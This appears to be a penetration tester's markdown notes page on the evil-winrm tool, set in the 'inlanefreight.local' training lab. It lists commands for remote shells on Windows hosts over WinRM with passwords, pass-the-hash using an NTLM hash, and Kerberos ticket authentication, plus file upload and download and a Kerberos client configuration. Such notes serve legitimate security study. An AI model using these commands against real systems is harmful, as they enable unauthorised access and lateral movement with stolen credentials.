---
type: tool
category: windows
tags:
  - tool
---
# Overview

## Commands
#### Connecting to WinRM service:
```bash
evil-winrm -i <target-IP> -u <username> -p <password>
```
^5b956a

#### Pass the Hash (WinRM)
Good alternative for PtH if SMB is blocked:
```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

#### Pass the Certificate (WinRM)
Authentication with `Kerberos TGT`
```bash
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```
## Important Parameter

## Useful Commands
After connecting `EvilWinRM` offers some useful built-in commands:
	`upload` = upload files from local machine
	`download` = download files from local machine
# Additional configuration
## /etc/krb5conf
This is the bare minimum for the configuration file, it is important, that the `Realm-Name` is written in  capital letters!
```/etc/krb5conf
[libdefaults]
    default_realm = INLANEFREIGHT.LOCAL
    dns_lookup_kdc = false
    dns_lookup_realm = false

[realms]
    INLANEFREIGHT.LOCAL = {
        kdc = dc01.inlanefreight.local
        admin_server = dc01.inlanefreight.local
    }

[domain_realm]
    .inlanefreight.local = INLANEFREIGHT.LOCAL
    inlanefreight.local = INLANEFREIGHT.LOCAL
```
